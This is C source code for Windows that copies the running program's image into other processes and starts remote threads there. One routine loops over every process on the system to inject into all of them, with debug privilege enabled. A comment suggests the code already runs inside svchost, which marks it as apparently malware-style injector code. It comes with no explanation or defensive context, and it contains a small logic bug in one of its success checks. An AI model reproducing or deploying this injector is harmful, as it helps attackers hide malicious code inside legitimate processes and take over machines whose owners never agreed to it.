DWORD WINAPI ProcessInject(HANDLE p_handle, DWORD (WINAPI f_Main)(LPVOID lParam), LPVOID lParam)
{		
	DWORD dwRead, dwOldProt, wNumBytes, dwNumBytes;
	IMAGE_DOS_HEADER ImageDosHeader; 
	IMAGE_OPTIONAL_HEADER32 ImageOptionalHeader;

	HANDLE hModule = GetModuleHandle(NULL);
	
	// inject code size
	DWORD dwSize = ((PIMAGE_OPTIONAL_HEADER)((LPVOID)((BYTE *)(BASEADDRESS) + 
					((PIMAGE_DOS_HEADER)(BASEADDRESS))->e_lfanew 
					+ sizeof(DWORD) + sizeof(IMAGE_FILE_HEADER))))->SizeOfImage;

	PBYTE Buffer = (PBYTE)VirtualAlloc(NULL, dwSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

	if (Buffer == NULL)
		return FALSE;
		
	BOOL bRPMem = ReadProcessMemory(GetCurrentProcess(), (LPCVOID)BASEADDRESS, 
				  (LPVOID)Buffer, dwSize, &dwRead);	
	
	if (bRPMem == 0)
		return FALSE;

	VirtualFreeEx(p_handle, (LPVOID)BASEADDRESS, dwRead, MEM_RELEASE);
		
	PBYTE pMem = (PBYTE)VirtualAllocEx(p_handle, (LPVOID)BASEADDRESS, dwRead, 
				 MEM_COMMIT|MEM_RESERVE, PAGE_EXECUTE_READWRITE);
										
	VirtualProtectEx(p_handle, pMem , dwRead, PAGE_EXECUTE_READWRITE, &dwOldProt);

	if (!WriteProcessMemory(p_handle, pMem, Buffer, dwRead, &dwNumBytes))
	{
		return FALSE;
	}

	HANDLE hInjThread = CreateRemoteThread(p_handle, 0, 0, &f_Main, lParam, 0, NULL); 

	if (hInjThread == NULL) 			 
	   return FALSE;

	return TRUE;
}

// -------------------------------------------------------- //

DWORD WINAPI StartProcInject(DWORD dwPid, LPTSTR p_Name, DWORD (WINAPI f_Main)(LPVOID lpParam), LPVOID lParam)
{

	if (dwPid == NULL)
	{
		dwPid = GetProcessIdByName(p_Name); 
		if(dwPid == 0) 
		{	
			return FALSE;
		}
	}
	
	HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwPid);
	
	if (hProcess == NULL)
		return FALSE;
		
//	SetPrivilege(SE_DEBUG_PRIV, TRUE);
	SetPrivilege(0x14, SE_DEBUG_PRIV, TRUE);
		ProcessInject(hProcess, f_Main, lParam); // inject
	SetPrivilege(0x14, SE_DEBUG_PRIV, FALSE);
//	SetPrivilege(SE_DEBUG_PRIV, FALSE);
	
	if(ProcessInject == FALSE) 
		return FALSE;
	
  return TRUE; 
}

// -------------------------------------------------------- //

DWORD WINAPI InjectAllProcesses(DWORD (WINAPI f_Main)(LPVOID))
{
	BOOL ret, flag 		= 	TRUE;
	HANDLE m_Snap 		= 	INVALID_HANDLE_VALUE;
	PROCESSENTRY32 pe 	= 	{sizeof(pe)};

	m_Snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS,NULL);

	if (m_Snap == INVALID_HANDLE_VALUE)
	{
		return NULL;
	}
	if (!Process32First(m_Snap, &pe))
	{
		return NULL;
	}

 	 do  {
			if (pe.th32ProcessID == GetCurrentProcessId()) continue; // do not inject at svchost twice
//			 if (pe.th32ProcessID == GetProcessIdByName(FIRSTINJPROC)) continue; 
//			OutputDebugString(pe.szExeFile);
			ret = StartProcInject(pe.th32ProcessID, NULL, f_Main, NULL);
//			Sleep(1000);
		 } 
	while (Process32Next(m_Snap, &pe)); 

	return NULL;
}